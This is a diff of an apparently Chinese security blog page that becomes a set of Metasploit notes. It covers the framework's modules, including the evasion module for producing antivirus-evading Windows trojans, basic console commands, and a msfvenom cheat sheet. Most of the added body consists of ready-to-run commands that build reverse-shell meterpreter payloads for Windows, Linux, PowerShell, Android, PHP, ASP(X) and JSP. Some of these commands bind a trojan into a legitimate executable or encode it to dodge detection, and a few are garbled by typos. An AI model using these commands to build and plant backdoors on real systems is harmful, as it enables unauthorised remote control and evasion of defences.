@@ -6,20 +6,22 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="msfvenom生成木马常用：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;daiorz&#x2F;archive&#x2F;2004&#x2F;01&#x2F;13&#x2F;12120067.html，https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gusi&#x2F;p&#x2F;12088198.html 使用方法：  1234567891011参数-p和-f必需。常用参数说明：-l 列出所有可用的载荷列表（payload）。-l payloads-p 选">
+    <meta name="description" content="各大模块：msf共有7个模块   auxiliary：主要包含辅助性脚本（扫描、嗅探、注入、爆破，漏洞挖掘） encoders：主要包含各种编码工具，以便绕过入侵检测和过滤系统 evasion：主要用于生成Windows免杀木马，以绕过360、火绒等的查杀 exploits：漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统&#x2F;服务&#x2F;模块 nops：绕过针对溢出攻击滑行字符串的拦截检测 payl">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msfvenom笔记">
-<meta property="og:url" content="http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="MSF笔记">
+<meta property="og:url" content="http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="R17a&#39;s blog">
-<meta property="og:description" content="msfvenom生成木马常用：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;daiorz&#x2F;archive&#x2F;2004&#x2F;01&#x2F;13&#x2F;12120067.html，https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gusi&#x2F;p&#x2F;12088198.html 使用方法：  1234567891011参数-p和-f必需。常用参数说明：-l 列出所有可用的载荷列表（payload）。-l payloads-p 选">
+<meta property="og:description" content="各大模块：msf共有7个模块   auxiliary：主要包含辅助性脚本（扫描、嗅探、注入、爆破，漏洞挖掘） encoders：主要包含各种编码工具，以便绕过入侵检测和过滤系统 evasion：主要用于生成Windows免杀木马，以绕过360、火绒等的查杀 exploits：漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统&#x2F;服务&#x2F;模块 nops：绕过针对溢出攻击滑行字符串的拦截检测 payl">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210303093725102.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210303100031590.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210303100041689.png">
 <meta property="og:image" content="http://yoursite.com/imgs/image-20210120152451121.png">
-<meta property="article:published_time" content="2020-11-19T09:07:29.000Z">
-<meta property="article:modified_time" content="2020-11-19T09:07:29.000Z">
+<meta property="article:published_time" content="2021-03-03T01:22:13.000Z">
+<meta property="article:modified_time" content="2021-03-03T01:22:13.000Z">
 <meta property="article:author" content="R17a">
-<meta property="article:tag" content="msfvenom">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210120152451121.png">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210303093725102.png">
     
     
         
@@ -39,7 +41,7 @@
         
     
     <!-- title -->
-    <title>msfvenom笔记</title>
+    <title>MSF笔记</title>
     <!-- styles -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -85,10 +87,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" href="/2020/11/23/Atlassian-Jira-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" href="/2021/04/07/Fastadmin%E6%9C%80%E6%96%B0rce%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" href="/2020/11/18/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" href="/2021/02/25/CVE-2021-21972-VMware-vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -101,22 +103,22 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&text=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&is_video=false&description=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=msfvenom笔记&body=Check out this article: http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&name=msfvenom笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&t=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&text=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&is_video=false&description=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MSF笔记&body=Check out this article: http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&name=MSF笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&t=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#各大模块："><span class="toc-number">1.</span> <span class="toc-text">各大模块：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用操作命令"><span class="toc-number">2.</span> <span class="toc-text">常用操作命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom"><span class="toc-number">3.</span> <span class="toc-text">msfvenom</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -128,7 +130,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        msfvenom笔记
+        MSF笔记
     </h1>
 
 
@@ -140,34 +142,47 @@
       
     <div class="postdate">
       
-        <time datetime="2020-11-19T09:07:29.000Z" itemprop="datePublished">2020-11-19</time>
+        <time datetime="2021-03-03T01:22:13.000Z" itemprop="datePublished">2021-03-03</time>
         
-        (Updated: <time datetime="2020-11-19T09:07:29.000Z" itemprop="dateModified">2020-11-19</time>)
+        (Updated: <time datetime="2021-03-03T01:22:13.000Z" itemprop="dateModified">2021-03-03</time>)
         
       
     </div>
 
 
       
-    <div class="article-category">
-        <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/msfvenom/">msfvenom</a>
-    </div>
-
 
       
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/msfvenom/" rel="tag">msfvenom</a>
-    </div>
-
 
     </div>
   </header>
   
 
   <div class="content" itemprop="articleBody">
-    <p>msfvenom生成木马常用：<a href="https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html" target="_blank" rel="noopener">https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html</a></p>
+    <h3 id="各大模块："><a href="#各大模块：" class="headerlink" title="各大模块："></a>各大模块：</h3><p>msf共有7个模块</p>
+<p><img src="/imgs/image-20210303093725102.png" alt="image-20210303093725102"></p>
+<ol>
+<li>auxiliary：主要包含辅助性脚本（扫描、嗅探、注入、爆破，漏洞挖掘）</li>
+<li>encoders：主要包含各种编码工具，以便绕过入侵检测和过滤系统</li>
+<li>evasion：主要用于生成Windows免杀木马，以绕过360、火绒等的查杀</li>
+<li>exploits：漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</li>
+<li>nops：绕过针对溢出攻击滑行字符串的拦截检测</li>
+<li>payloads：攻击荷载，目标系统在被渗透攻击后而执行的代码</li>
+<li>post：后渗透模块，向目标发送的一些功能性指令，如提权，获取hash等</li>
+</ol>
+<h3 id="常用操作命令"><a href="#常用操作命令" class="headerlink" title="常用操作命令"></a>常用操作命令</h3><p>基础命令：</p>
+<p><img src="/imgs/image-20210303100031590.png" alt="image-20210303100031590"></p>
+<figure class="highlight bash"><figcaption><span>核心命令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">banner <span class="comment">#用于查看metasploit的版本信息，利用模块数量、payload数量</span></span><br><span class="line">connect <span class="comment">#类似nc connect 10.0.0.138 80</span></span><br><span class="line">load <span class="comment">#加载插件</span></span><br><span class="line">info <span class="comment">#查看所在模块的信息</span></span><br><span class="line">route <span class="comment">#代理转发</span></span><br><span class="line">sessions <span class="comment">#会话id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210303100041689.png" alt="image-20210303100041689"></p>
+<p>模块使用命令：</p>
+<p>一般流程：查找模块-&gt;使用模块-&gt;查看并设置参数-&gt;利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search module <span class="comment">#查找模块</span></span><br><span class="line">use module <span class="comment">#使用模块</span></span><br><span class="line">options/info <span class="comment">#查看参数</span></span><br><span class="line"><span class="built_in">set</span> options <span class="comment"># 设置参数</span></span><br><span class="line">run/exploit <span class="comment">#利用</span></span><br><span class="line">back/background <span class="comment">#当前会话移到后台</span></span><br></pre></td></tr></table></figure>
+
+<p>job相关命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span> <span class="comment">#查看job</span></span><br><span class="line"><span class="built_in">kill</span> <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>生成木马常用：<a href="https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html" target="_blank" rel="noopener">https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html</a></p>
 <p>使用方法：</p>
 <p><img src="/imgs/image-20210120152451121.png" alt="image-20210120152451121"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数-p和-f必需。常用参数说明：</span><br><span class="line">-l 列出所有可用的载荷列表（payload）。-l payloads</span><br><span class="line">-p 选择一个payload，也可以自定义payload</span><br><span class="line">-f 生成文件格式，-help-formats，可查看支持的所有输出格式</span><br><span class="line">-e 编码方式，-l encoders，可查看支持使用的编码器</span><br><span class="line">-i 编码次数</span><br><span class="line">-a 系统架构，默认x86，指定平台：--platform xxx，-l platforms</span><br><span class="line">-b 在生成的payload中避免出现的值，msfvenom会自动寻找合适的编码器来编码payload</span><br><span class="line">-x 指定一个自定义的可执行文件作为模板，也就是将木马捆绑到这个可执行文件</span><br><span class="line">-k 当模板被执行时，payload自动分离并注入到新的进程中，一般和-x选项一起使用</span><br><span class="line">-o 指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure>
@@ -181,6 +196,11 @@
 <p>示例：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通生成</span></span><br><span class="line">msfvenom -p windows/ meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br><span class="line"><span class="comment"># 编码处理型</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br><span class="line"><span class="comment"># 搁绑</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x c:\nomal.exe -k -f exe -o c:\shell.exe</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -e x86/shikata_ga_nai -b <span class="string">'\x00\x0a\xff'</span> -i 3 -f exe -o x86_shell.exe</span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IPAddress&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"><span class="comment"># PowerShell</span></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell/reverse_tcp LHOST= 192.168.3.12 LPORT=443 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1 </span><br><span class="line"><span class="comment"># Android</span></span><br><span class="line">msfvenom -a x86 --platform Android -pandroid/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f apk -o x86_shell.apk</span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">msfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.1 68.3.12 LPORT=443 -f raw -o x86_shell.php</span><br><span class="line"><span class="comment"># Asp</span></span><br><span class="line">msfvenom -p windows/meterprete/reverse_tcp LHOST=&lt;Your IPAddress&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"><span class="comment"># Aspx</span></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f aspx -o x86_shell.aspx</span><br><span class="line"><span class="comment"># JSP</span></span><br><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST= 192.168.3.2 LPORT=443 -f raw -o x86_shell.jsp</span><br></pre></td></tr></table></figure>
 
+
+
+<p>相关链接：</p>
+<p><a href="https://www.secpulse.com/archives/123339.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/123339.html</a></p>
+<p><a href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/131.html" target="_blank" rel="noopener">http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/131.html</a></p>
 
   </div>
 </article>
@@ -212,22 +232,22 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#各大模块："><span class="toc-number">1.</span> <span class="toc-text">各大模块：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用操作命令"><span class="toc-number">2.</span> <span class="toc-text">常用操作命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom"><span class="toc-number">3.</span> <span class="toc-text">msfvenom</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&text=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&is_video=false&description=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=msfvenom笔记&body=Check out this article: http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&title=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&name=msfvenom笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/19/msfvenom%E7%AC%94%E8%AE%B0/&t=msfvenom笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&text=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&is_video=false&description=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MSF笔记&body=Check out this article: http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&title=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&name=MSF笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/03/MSF%E7%AC%94%E8%AE%B0/&t=MSF笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
